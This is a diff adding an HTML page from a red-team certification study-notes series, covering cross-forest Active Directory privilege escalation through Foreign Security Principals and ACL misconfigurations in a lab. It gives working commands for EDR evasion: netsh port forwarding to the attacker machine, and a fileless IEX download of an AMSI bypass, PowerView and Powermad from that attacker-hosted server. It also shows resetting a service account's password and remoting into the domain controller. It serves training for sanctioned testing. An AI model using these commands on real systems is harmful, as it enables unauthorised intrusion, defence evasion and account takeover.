@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cross Forest Attacks - Foreign Security Principals | Mr Stark Study Notes</title>
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .goad-content { max-width: 100%; margin: 0 auto; padding: 30px; font-size: 20px; }
+    .goad-content h1 { color: var(--white-2); font-size: 36px; margin-bottom: 25px; }
+    .goad-content h2 { color: var(--orange-yellow-crayola); font-size: 30px; margin: 35px 0 20px 0; padding-bottom: 10px; border-bottom: 1px solid var(--jet); }
+    .goad-content h3 { color: var(--white-1); font-size: 26px; margin: 30px 0 15px 0; }
+    .goad-content h4 { color: var(--white-2); font-size: 24px; margin: 25px 0 15px 0; }
+    .goad-content p { color: var(--light-gray); margin-bottom: 18px; line-height: 1.8; font-size: 20px; word-wrap: break-word; overflow-wrap: break-word; }
+    .goad-content code { background: var(--onyx); color: var(--orange-yellow-crayola); padding: 3px 8px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 18px; }
+    .goad-content pre { background: var(--eerie-black-2); border: 1px solid var(--jet); border-radius: 8px; padding: 20px; overflow-x: auto; margin: 20px 0; }
+    .goad-content pre code { background: transparent; color: var(--light-gray); padding: 0; font-size: 18px; }
+    .goad-content ul, .goad-content ol { margin: 20px 0; padding-left: 30px; }
+    .goad-content li { color: var(--light-gray); margin-bottom: 10px; font-size: 20px; line-height: 1.8; }
+    .goad-content img { max-width: 100%; border-radius: 8px; margin: 25px 0; border: 1px solid var(--jet); }
+    .goad-content blockquote { border-left: 4px solid var(--orange-yellow-crayola); padding-left: 20px; margin: 20px 0; color: var(--light-gray-70); }
+    .goad-content hr { border: none; border-top: 1px solid var(--jet); margin: 40px 0; }
+    .goad-content table { width: 100%; border-collapse: collapse; margin: 25px 0; font-size: 18px; }
+    .goad-content th, .goad-content td { border: 1px solid var(--jet); padding: 12px; text-align: left; color: var(--light-gray); }
+    .goad-content th { background: var(--eerie-black-2); color: var(--white-2); font-weight: 500; }
+    .part-navigation { display: flex; justify-content: space-between; margin-top: 50px; padding-top: 30px; border-top: 1px solid var(--jet); }
+    .part-navigation a { color: var(--orange-yellow-crayola); text-decoration: none; font-size: 18px; display: flex; align-items: center; gap: 8px; }
+    .part-navigation a:hover { text-decoration: underline; }
+    .goad-sidebar-list { list-style: none; padding: 0; margin: 0; }
+    .goad-sidebar-list li { margin-bottom: 8px; }
+    .goad-sidebar-list a { color: var(--light-gray); text-decoration: none; font-size: 14px; display: block; padding: 5px 0; transition: color 0.25s ease; }
+    .goad-sidebar-list a:hover { color: var(--orange-yellow-crayola); }
+    .back-link { display: flex; align-items: center; gap: 8px; color: var(--orange-yellow-crayola); text-decoration: none; font-size: 14px; margin-bottom: 15px; }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTE Series</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Parts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <a href="../index.html" class="back-link">
+          <ion-icon name="arrow-back-outline"></ion-icon>
+          Back to Portfolio
+        </a>
+        <div class="separator"></div>
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Jump to Part:</p>
+        <ul class="goad-sidebar-list">
+<li><a href="part-01-introduction.html">Part 1: Part 1</a></li>
+<li><a href="part-02-enumeration.html">Part 2: Part 2</a></li>
+<li><a href="part-03-privilege-escalation.html">Part 3: Part 3</a></li>
+<li><a href="part-04-kerberoasting-attack.html">Part 4: Part 4</a></li>
+<li><a href="part-05-privilege-escalation-targeted-kerberoasting.html">Part 5: Part 5</a></li>
+<li><a href="part-06-privilege-escalation-laps-local-administrator-pass.html">Part 6: Part 6</a></li>
+<li><a href="part-07-dumping-lsass-credentials.html">Part 7: Part 7</a></li>
+<li><a href="part-08-privilege-escalation-gmsa-attack.html">Part 8: Part 8</a></li>
+<li><a href="part-09-lsass-attack-with-mde-bypass.html">Part 9: Part 9</a></li>
+<li><a href="part-10-pass-the-certificates-attack.html">Part 10: Part 10</a></li>
+<li><a href="part-11-privilege-escalation---unconstraine.html">Part 11: Privilege Escalation - Unconstrained Delegation</a></li>
+<li><a href="part-12-privilege-escalation---constrained-.html">Part 12: Privilege Escalation - Constrained Delegation</a></li>
+<li><a href="part-13-privilege-escalation---rbcd.html">Part 13: Privilege Escalation - RBCD</a></li>
+<li><a href="part-14-domain-persistence---golden-ticket-.html">Part 14: Domain Persistence - Golden Ticket Attack</a></li>
+<li><a href="part-15-domain-persistence---silver-ticket-.html">Part 15: Domain Persistence - Silver Ticket Attack</a></li>
+<li><a href="part-16-domain-persistence---diamond-ticket.html">Part 16: Domain Persistence - Diamond Ticket Attack</a></li>
+<li><a href="part-17-domain-persistence---skeleton-key-a.html">Part 17: Domain Persistence - Skeleton Key Attack</a></li>
+<li><a href="part-18-domain-persistence---sapphire-ticke.html">Part 18: Domain Persistence - Sapphire Ticket Attack</a></li>
+<li><a href="part-19-domain-persistence---adminsdholder-.html">Part 19: Domain Persistence - AdminSDHolder Attack</a></li>
+<li><a href="part-20-cross-domain-attacks---active-direc.html">Part 20: Cross Domain Attacks - Active Directory Certificate</a></li>
+<li><a href="part-21-shadow-credentials---abusing-user-o.html">Part 21: Shadow Credentials - Abusing User Object</a></li>
+<li><a href="part-22-cross-domain-attacks---unconstraine.html">Part 22: Cross Domain Attacks - Unconstrained Delegation</a></li>
+<li><a href="part-23-cross-domain-attacks---attacking-az.html">Part 23: Cross Domain Attacks - Attacking Azure AD Integration</a></li>
+<li><a href="part-24-cross-domain-attacks---child-to-for.html">Part 24: Cross Domain Attacks - Child To Forest Root SID History</a></li>
+<li><a href="part-25-cross-domain-attacks---child-to-for.html">Part 25: Cross Domain Attacks - Child To Forest Root SID History (Part 2)</a></li>
+<li><a href="part-26-cross-forest-attacks---kerberoast-a.html">Part 26: Cross Forest Attacks - Kerberoast Attack</a></li>
+<li><a href="part-27-cross-forest-attacks---constrained-.html">Part 27: Cross Forest Attacks - Constrained Delegation</a></li>
+<li><a href="part-28-cross-forest-attacks---unconstraine.html">Part 28: Cross Forest Attacks - Unconstrained Delegation</a></li>
+<li><a href="part-29-cross-forest-attacks---trust-key-ab.html">Part 29: Cross Forest Attacks - Trust Key Abuse</a></li>
+<li><a href="part-30-cross-forest-attacks---injecting-si.html">Part 30: Cross Forest Attacks - Injecting SID History</a></li>
+<li><a href="part-31-trust-abuse---mssql-servers-databas.html">Part 31: Trust Abuse - MSSQL Servers Database Links</a></li>
+<li><a href="part-32-cross-forest-attacks---foreign-secu.html" style="color: var(--orange-yellow-crayola);">Part 32: Cross Forest Attacks - Foreign Security Principals</a></li>
+<li><a href="part-33-cross-forest-attacks---abusing-pam.html">Part 33: Cross Forest Attacks - Abusing PAM</a></li>
+<li><a href="part-34-cross-forest-attacks---trusting-to-.html">Part 34: Cross Forest Attacks - Trusting to Trusted Trust Key</a></li>
+<li><a href="part-35-cross-forest-attacks---abusing-trus.html">Part 35: Cross Forest Attacks - Abusing Trust Transitivity</a></li>
+        </ul>
+      </div>
+    </aside>
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <div class="goad-content">
+<h1>CRTE - Certified Red Team Expert</h1>
+<h2><strong>Cross Forest Attacks - Foreign Security Principals & ACLs</strong></h2>
+<p>Cross-forest attacks rely on the trust relationships established between separate Active Directory forests. When two organizations or entities create a trust, they allow authentication and authorization to extend beyond their individual forest boundaries. One of the key elements in these attacks is the concept of Foreign Security Principals (FSPs) and Access Control Lists (ACLs), which we can manipulate to escalate privileges and move laterally.</p>
+<p>When a trust is established between two forests, Active Directory automatically creates Foreign Security Principals in the trusting domain to represent users and groups from the trusted forest. These FSPs are identified by their security identifiers (SIDs) and can be assigned permissions within the trusting domain, just like native security principals. The issue arises when these principals are granted excessive permissions or when we can abuse ACLs to escalate privileges.</p>
+<p>Access Control Lists define who can access or modify objects in Active Directory. If an FSP has overly permissive rights over a critical object, such as a Domain Admin group or a service account, we can leverage these rights to gain higher privileges within the trusting domain. One common attack vector involves modifying ACLs to grant ourselves privileges that allow further exploitation, such as replicating directory services data, adding users to privileged groups, or controlling high-value targets like service accounts.</p>
+<p>A crucial aspect of these attacks is the abuse of the GenericAll or GenericWrite permissions over key objects. If an FSP has these permissions on a privileged group, we can add ourselves to that group or modify an account’s attributes to escalate our access. Another important permission to look for is WriteDACL, which allows us to modify the ACLs of an object and grant ourselves full control. When targeting service accounts, we may also look for the ability to modify userPassword or msDS-AllowedToDelegateTo attributes, which can enable further privilege escalation.</p>
+<p>To execute these attacks effectively, we typically need to enumerate trust relationships and analyze ACLs within the trusting domain. Tools like BloodHound can help us visualize these relationships and identify exploitable ACLs. If we control an account in the trusted forest and it has excessive privileges in the trusting forest, we can manipulate ACLs to gain higher access and pivot further into the environment.</p>
+<p>Once we have a foothold in the trusting forest, our next move depends on the privileges we have gained. If we manage to compromise a privileged account, we can execute attacks such as DCSync, Kerberoasting, or even Golden Ticket attacks to maintain long-term access. If the trust is a two-way trust, we may also have the opportunity to move back into the original forest with elevated privileges.</p>
+<p>Understanding these attacks requires a strong grasp of how Active Directory trusts work, how security principals are represented across forests, and how ACLs dictate access control. By analyzing the permissions granted to Foreign Security Principals and identifying misconfigurations, we can uncover critical attack paths that allow us to escalate privileges and move laterally across trusted domains.</p>
+<h3>Use Case Scenario</h3>
+<p>Let’s say we have two separate Active Directory forests: <strong>ForestA.com</strong> and <strong>ForestB.com</strong>. These two organizations decide to establish a trust relationship so that users from <strong>ForestA</strong> can access resources in <strong>ForestB</strong>. This is a one-way trust where <strong>ForestA</strong> is the trusted domain, and <strong>ForestB</strong> is the trusting domain. This means that users from <strong>ForestA</strong> can be given access to resources in <strong>ForestB</strong>, but not the other way around.</p>
+<p>Once this trust is established, Active Directory automatically creates <strong>Foreign Security Principals (FSPs)</strong> in <strong>ForestB</strong> to represent users and groups from <strong>ForestA</strong>. These FSPs are stored in the <code>ForeignSecurityPrincipals</code> container in <strong>ForestB</strong> and are referenced by their <strong>Security Identifiers (SIDs)</strong> rather than traditional usernames.</p>
+<p>Now, let’s assume that an administrator in <strong>ForestB</strong> decides to grant access to a shared folder on a file server. Instead of manually creating a new user in <strong>ForestB</strong>, they add a security group from <strong>ForestA</strong> to the folder’s permissions. As a result, a <strong>Foreign Security Principal</strong> (FSP) for that group is created in <strong>ForestB</strong>, allowing its members from <strong>ForestA</strong> to access the folder.</p>
+<p>At first, this may seem harmless. However, the problem arises when these <strong>Foreign Security Principals</strong> are granted excessive permissions beyond what they should have. Let’s say an administrator in <strong>ForestB</strong> mistakenly assigns an FSP (which represents a security group from <strong>ForestA</strong>) <strong>Full Control</strong> over a sensitive Active Directory group, such as <strong>Server Admins</strong> or even <strong>Domain Admins</strong>.</p>
+<p>If we are a malicious actor who has compromised an account in <strong>ForestA</strong> that is a member of this security group, we now have control over an administrative group in <strong>ForestB</strong>. This means we can modify its membership, granting ourselves full administrative rights in <strong>ForestB</strong>, even though we were never supposed to have that level of access.</p>
+<p>A more subtle scenario could involve <strong>Access Control List (ACL) misconfigurations</strong>. Suppose an FSP from <strong>ForestA</strong> is granted <strong>GenericAll</strong> or <strong>GenericWrite</strong> permissions over a user account or security group in <strong>ForestB</strong>. If we control the compromised account in <strong>ForestA</strong>, we can modify attributes of the target object in <strong>ForestB</strong>, potentially resetting passwords, adding ourselves to privileged groups, or escalating access further.</p>
+<p>Once we have administrative privileges in <strong>ForestB</strong>, we can move laterally, dump credentials, escalate further, or even establish persistence. The critical issue here is that <strong>the administrators in ForestB might not be aware of how much control they are giving to users from ForestA</strong> because the permissions are applied to an <strong>FSP object identified only by a SID</strong>, making it harder to track.</p>
+<p>This scenario illustrates how an attacker can <strong>abuse trust relationships and misconfigured ACLs</strong> to escalate privileges across forests. Even though <strong>ForestA</strong> was not initially compromised, the trust relationship allowed a compromised user in <strong>ForestA</strong> to gain control over resources in <strong>ForestB</strong>, leading to a full domain takeover.</p>
+<h2>Portforwarding to bypass EDR</h2>
+<p>What If we simply  download and execute <code>PowerView</code> in memory on the target machine?</p>
+<p>We could simply run <code>PowerView</code> calling it straight from our attacking IP, but we would easily be caught by Defender or any sort of defense mechanism in place on our network.</p>
+<h3>Let’s highlights the importance of my statement above.</h3>
+<p>Evading detection by security tools when performing actions such as credential dumping with tools like PowerView can be a trigger to compromise all our Red Team operation and let me tell you why.</p>
+<ul>
+<li><strong>Direct Execution is Easily Detected</strong>: Running tools like <code>PowerView</code> directly from an attacker's IP address makes it easy for security tools to detect the activity. Security mechanisms, such as <strong>Windows Defender and Microsoft Defender for Endpoint (MDE)</strong>, are designed to identify known malicious tools, their signatures, and their behaviors.</li>
+<li><strong>Signature-Based Detection:</strong> Security tools often use signature-based detection to identify known malicious software. If <code>PowerView</code> is run directly, its known signatures can trigger alerts.</li>
+<li><strong>Behavior-Based Detection</strong>: Security tools also monitor the behavior of programs. Running <code>PowerView</code> directly, can trigger behavioral-based detection.</li>
+<li><strong>Network Traffic Monitoring:</strong> When PowerView is executed from an external IP, it generates network traffic that can be monitored and flagged by security tools.</li>
+<li><strong>Downloading from External Sources:</strong> Downloading an executable from a remote machine is considered suspicious and can trigger behavior-based detection by Windows Defender.</li>
+<li><strong>Process Creation and Command Line Logs:</strong> Process creation logs and command line logs can reveal suspicious activity, such as the execution of known hacking tools with particular arguments.</li>
+<li><strong>Bypassing Detection Mechanisms</strong>: To avoid detection, attackers need to implement various bypass techniques, including:</li>
+</ul>
+</ul>
+<p>In summary, running PowerView or any other PowerShell script directly from an attacking IP is highly likely to be detected by most modern security tools. Therefore, attackers use advanced techniques like obfuscation, memory loading, process injection, and port forwarding to evade detection. The course material emphasizes these techniques in order to learn about these types of attacks and to improve red team Opsec.</p>
+<p>To avoid being caught by any defensive mechanism, we can  simply create a PortForwarding on the target machine then call PowerView using it’s localhost IP.</p>
+<p>Since we have a Powershell remote access to the target, we need to use <code>cmd.exe /c " "</code> to be able to run <code>netsh</code> command since it’s cmdlet command.</p>
+<p><code>cmd.exe /c "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=80 connectaddress=192.168.100.163"</code></p>
+<img src="./images/screenshot_428.png" alt="image">
+<p><code>netsh interface portproxy add v4tov4</code><strong>:</strong></p>
+<ul>
+<li><strong>Obfuscation:</strong> Obfuscating the tool's code and arguments to avoid signature-based detection. This can involve renaming variables, removing comments, and encoding parameters.</li>
+<li><strong>Memory Loading:</strong> Loading the tool into memory without writing it to disk, using a tool like a loader, avoids file-based detection.</li>
+<li><strong>Process Injection</strong>: Injecting shellcode into a trusted process can allow covert execution without using standard API calls that are heavily monitored.</li>
+<li><strong>Port Forwarding</strong>: Forwarding network traffic from the local machine to a student VM can mask the attacker's IP address and evade detection.</li>
+<li><strong>Using Built-in Tools</strong>: The course emphasizes using built-in tools as much as possible, as they are less likely to be flagged by security software. For example, using <code>netsh</code> to set up port forwarding or built-in Windows utilities over custom tools.</li>
+<li><strong>Mimicking Normal Behavior</strong>: Downloading tools using a web browser instead of a command-line tool, for example, can help blend in with normal network activity.</li>
+<li><code>netsh interface portproxy</code><strong>:</strong> This is the part of the <code>netsh</code> utility that deals with port forwarding. It allows forwarding TCP traffic from one IP/port combination to another.</li>
+<li><code>add</code><strong>:</strong> Specifies that you're adding a new forwarding rule.</li>
+<li><code>v4tov4</code><strong>:</strong> Indicates that both the listening and connecting addresses use IPv4.</li>
+</ul>
+</ul>
+<h3><strong>2. </strong><code>listenport=8080</code><strong>:</strong></h3>
+<ul>
+<li>The port on the <strong>local machine (target machine)</strong> where the service will "listen" for incoming connections.</li>
+<li>In this case, the machine will listen on port <code>8080</code>.</li>
+</ul>
+<h3><strong>3. </strong><code>listenaddress=127.0.0.1</code><strong>:</strong></h3>
+<ul>
+<li>The IP address on the <strong>local machine</strong> where the service will listen for connections.</li>
+<li><code>0.0.0.0</code> means it will listen on all network interfaces available on the machine (e.g., public, private, or loopback IPs).</li>
+</ul>
+<h3><strong>4. </strong><code>connectport=80</code><strong>:</strong></h3>
+<ul>
+<li>The port on the <strong>remote machine (Out Attacking Machine)</strong> to which traffic will be forwarded.</li>
+<li>In this case, port <code>80</code> (commonly used for HTTP).</li>
+</ul>
+<h3><strong>5. </strong><code>connectaddress=192.168.100.163</code><strong>:</strong></h3>
+<ul>
+<li>The IP address of the <strong>remote machine (Our Attacking Machine)</strong>.</li>
+</ul>
+<p>This port forwarding setup redirects traffic received on port 8080 from our compromised machine to port 80 on our attacking machine (192.168.100.163),  which acts as a bridge. **</p>
+<p>**We can also use the flags <code>show all</code> from <code>netsh</code> to confirm if our portforwarding configuration worked.</p>
+<p><code>cmd.exe /c "netsh interface portproxy show all"</code></p>
+<img src="./images/screenshot_429.png" alt="image">
+<h2>Hosting files local files</h2>
+<p>We should be hosting all the files we will be requesting further more in our attacking host. This will be requested by our Target <code>DB-SQLSRV</code>.</p>
+<img src="./images/screenshot_430.png" alt="image">
+<h3>Disabling Defender</h3>
+<p>Before we carry on with our target host, we need to disable our firewall on our side. This way we can host the file on our machine with no issues, without having the firewall complaining.</p>
+<img src="./images/screenshot_431.png" alt="image">
+<h1>Enumerating Forest Trusts</h1>
+<p>We will be bypassing AMSI and importing <strong>PowerView</strong> directly into memory using a single command. First, we load an AMSI bypass script from a remote source, which disables the <strong>Antimalware Scan Interface (AMSI)</strong>, preventing PowerShell from detecting and blocking our script execution. Once AMSI is bypassed, we download and execute <strong>PowerView</strong>, a PowerShell tool used for Active Directory enumeration. By executing both scripts in a single line, we ensure that PowerView runs without interference from AMSI, allowing us to enumerate domain objects stealthily.</p>
+<p>This approach keeps the execution fileless, meaning no scripts are saved to disk, reducing the chances of detection by antivirus or endpoint security solutions.</p>
+<p><code>IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/amsibypass.txt'); IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/PowerView.ps1'); IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/powermad.ps1')</code></p>
+<p>Now that we have bypassed and imported PowerView into the memory, we can start enumerating the Forest Trust configure inside <code>db.local</code> domain.</p>
+<p><code>Get-ForestTrust</code></p>
+<img src="./images/screenshot_432.png" alt="image">
+<p>The enumeration confirms that there is a bidirectional forest trust between <code>db.local</code> and <code>dbvendor.local</code>. This means that both forests trust each other, allowing authentication and resource access across domains. Users from <strong>db.local</strong> can be granted access to resources in <strong>dbvendor.local</strong>, and vice versa. Since it is a forest trust, the relationship applies to the entire directory structure within each forest. This also implies the existence of <strong>Foreign Security Principals (FSPs)</strong> in both forests, representing users or groups from the other forest. If any of these FSPs are assigned excessive permissions within Active Directory, it could be possible to manipulate Access Control Lists (ACLs) to escalate privileges. Given this setup, an attacker with access to one forest may be able to move laterally or escalate privileges into the other if security misconfigurations exist.</p>
+<p>Now that we know that <code>db.local</code> has a forest trust with <code>dbvendor.local</code>, let’s enumerate and findout if we do have some interesting <strong>ACLs</strong> in <code>dbvendor.local</code> forest.</p>
+<p><code>Find-InterestingDomainAcl -ResolveGUIDs -Domain 'dbvendor.local'</code></p>
+<img src="./images/screenshot_433.png" alt="image">
+<p>The <strong>ACL enumeration</strong> using <code>Find-InterestingDomainAcl</code> reveals that the user <strong>srvdba</strong> from <strong>db.local</strong> has <code>GenericAll</code> rights over the service account <strong>db163svc</strong> in <strong>dbvendor.local</strong>. This means that <strong>srvdba</strong> has <strong>full control</strong> over <strong>db163svc</strong>, allowing actions such as modifying its attributes, resetting its password, setting SPN on user for Targeted Kerberoasting or adding it to privileged groups. Since <strong>db163svc</strong> is in <strong>dbvendor.local</strong>, this could be an entry point for <strong>privilege escalation</strong> within the dbvendor forest. Given that already controll <strong>srvdba (we are srvdba)</strong> from <strong>db.local</strong>, this also indicates a potential <strong>cross-forest attack vector</strong>, where we could exploit this ACL misconfiguration to gain further access in <strong>dbvendor.local</strong>.</p>
+<h1>Resetting User’s Account with PowerMad</h1>
+<p>Let’s use <code>Set-DomainUserPassword</code> from PowerMad to accomplish the task of resetting <code>db163svc</code> account. <code>Set-DomainUserPassword</code> allows you to <strong>reset the password</strong> of a user in Active Directory <strong>without requiring the current password</strong>, provided you have the necessary privileges (e.g., GenericAll or ResetPassword rights on the target user).</p>
+<p><code>Set-DomainUserPassword -Identity db163svc -AccountPassword (ConvertTo-SecureString 'Stark@123' -AsPlainText -Force) -Domain dbvendor.local –Verbose</code></p>
+<img src="./images/screenshot_434.png" alt="image">
+<p>We were able to reset <code>db163svc</code> account.</p>
+<h1>Enumerating Foreign Security Principals with PowerView</h1>
+<p>The <code>Find-ForeignGroup</code> function helps identify <strong>foreign security principals</strong> by finding <strong>groups in the current domain that contain members from external (trusted) domains or forests</strong>. It is useful in cross-domain or cross-forest trust enumeration, where we need to determine which external users or groups have been granted permissions in our environment.</p>
+<p><code>Find-ForeignGroup -Verbose</code></p>
+<img src="./images/screenshot_435.png" alt="image">
+<p>Our <strong>Find-ForeignGroup</strong> enumeration results indicate that all <strong>Foreign Security Principal (FSP)</strong> that are member of the <strong>Builtin Administrators</strong> group in <strong>db.local</strong>. This means that an account from an external domain (from a trusted forest “<code>dbvendor.local</code>”) has been granted <strong>administrative privileges</strong> within <strong>db.local</strong>.</p>
+<p>The <strong>MemberName</strong> appears as a <strong>Security Identifier (SID)</strong> instead of a recognizable username, which confirms that it is an external account from another domain or forest.</p>
+<p>The <strong>MemberDistinguishedName</strong> also places it under <strong>ForeignSecurityPrincipals</strong>, which is the container where Active Directory stores objects representing users or groups from trusted domains.</p>
+<p>This is significant because it shows that <strong>a foreign user or group has high privileges inside db.local</strong>, meaning it could be a potential attack path. If this external account gets compromised, an attacker could leverage its permissions to take full control over <strong>db.local</strong>. To assess the risk, you should investigate which external domain this FSP belongs to and whether it was intentionally granted administrative access.</p>
+<p>If the compromised user’s SID is listed in the <code>Find-ForeignGroup</code> results, that means the user has <strong>administrative privileges</strong> in <strong>db.local</strong>, and we can escalate our attack further.</p>
+<p>Enumerating the user we compromised earlier by resetting its password, we can confirm that this user is also a valid user from <code>dbvendor.local</code> domain.</p>
+<p>Note: since this</p>
+<p><code>Get-DomainUser -Domain dbvendor.local | ?{$_.ObjectSid -eq 'S-1-5-21-569087967-1859921580-1949641513-15613'}</code></p>
+<img src="./images/screenshot_436.png" alt="image">
+<p>Accessing now db-dc.dc.local with the compromised account <code>db163svc</code> using winrs.</p>
+<p><code>winrs -r:db-dc.db.local -u:dbvendor\db163svc -p:Stark@123 cmd</code></p>
+<img src="./images/screenshot_437.png" alt="image">
+<h1>PowerShell Remoting on the reverse shell</h1>
+<p>We can use PowerShell Remoting to remotlly access the db.local domain controller as well <code>db-eu.db.local</code>.</p>
+<p>`$passwd = ConvertTo-SecureString 'Stark@123' -AsPlainText -Force</p>
+<p>$creds = New-Object System.Management.Automation.PSCredential ("dbvendor\db163svc", $passwd)</p>
+<p>$dbdc = New-PSSession -Computername db-dc.db.local -Credential $creds</p>
+<p>Invoke-Command -scriptblock{whoami;hostname} -Session $dbdc` ![image](./images/screenshot_438.png)</p>
+          <div class="part-navigation">
+            <a href="part-31-trust-abuse---mssql-servers-databas.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Trust Abuse - MSSQL </a>
+            <a href="part-33-cross-forest-attacks---abusing-pam.html">Next: Cross Forest Attacks <ion-icon name="arrow-forward-outline"></ion-icon></a>
+          </div>
+        </div>
+      </article>
+    </div>
+  </main>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+  <script src="../assets/js/script.js"></script>
+</body>
+</html>
